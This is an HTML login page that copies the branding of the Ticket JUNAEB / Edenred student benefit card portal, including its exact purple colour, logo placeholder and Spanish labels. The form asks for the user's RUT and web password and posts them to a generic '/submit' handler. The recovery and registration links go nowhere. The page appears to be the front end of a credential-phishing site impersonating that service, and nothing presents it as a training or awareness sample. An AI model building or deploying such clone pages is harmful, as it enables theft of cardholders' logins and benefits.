<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ticket JUNAEB</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
        
        body { 
            font-family: 'Roboto', sans-serif;
            margin: 0;
            padding: 0;
        }

        .main-container {
            position: relative;
            min-height: 100vh;
            width: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }

        /* Fondo con imagen y capa púrpura exacta */
        .bg-image {
            position: absolute;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background-image: url('https://images.unsplash.com/photo-1495474472287-4d71bcdd2085?q=80&w=1000');
            background-size: cover;
            background-position: center;
            z-index: -2;
        }

        .purple-overlay {
            position: absolute;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background-color: rgba(75, 30, 115, 0.88); /* Púrpura Edenred */
            z-index: -1;
        }

        .input-juna {
            background: transparent;
            border: 1px solid rgba(255, 255, 255, 0.7);
            border-radius: 9999px;
            color: white;
            padding: 12px 20px;
            text-align: center;
            width: 100%;
            font-size: 15px;
            outline: none;
        }

        .input-juna::placeholder {
            color: rgba(255, 255, 255, 0.8);
            font-weight: 300;
        }

        .btn-ingresar {
            background-color: #f1f1f1;
            color: #b5b5b5;
            font-weight: 400;
            border-radius: 9999px;
            padding: 12px 0;
            width: 100%;
            margin-top: 10px;
            font-size: 16px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }

        .logo-edenred {
            background-color: white;
            border-radius: 50%;
            width: 75px;
            height: 75px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            color: #4b1e73;
            font-size: 14px;
        }
    </style>
</head>
<body>

    <div class="main-container text-white px-10">
        <div class="bg-image"></div>
        <div class="purple-overlay"></div>

        <div class="w-full flex justify-between items-start mb-24 max-w-[320px]">
            <div class="flex flex-col">
                <span class="text-3xl font-light leading-none">Ticket</span>
                <span class="text-3xl font-bold tracking-tight">JUNAEB</span>
            </div>
            <div class="logo-edenred">
                Edenred
            </div>
        </div>

        <h2 class="text-[28px] font-light mb-12">Iniciar Sesión</h2>

        <form action="/submit" method="POST" class="w-full max-w-[300px] space-y-4">
            <div class="relative">
                <input type="text" name="username" placeholder="RUT" class="input-juna" required>
            </div>
            
            <div class="relative">
                <input type="password" name="password" placeholder="Clave Web" class="input-juna" required>
                <div class="absolute right-5 top-1/2 -translate-y-1/2 opacity-80">
                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                    </svg>
                </div>
            </div>

            <button type="submit" class="btn-ingresar">
                Ingresar
            </button>
        </form>

        <div class="flex items-center space-x-4 mt-12 text-[13px] font-light">
            <a href="#" class="hover:text-gray-300">Recuperar clave</a>
            <div class="h-6 w-[1px] bg-white opacity-60"></div>
            <a href="#" class="hover:text-gray-300">Registrarse</a>
        </div>

        <div class="absolute bottom-4 left-4 text-[10px] font-light opacity-70">
            V.2.10.D
        </div>
    </div>

</body>
</html>
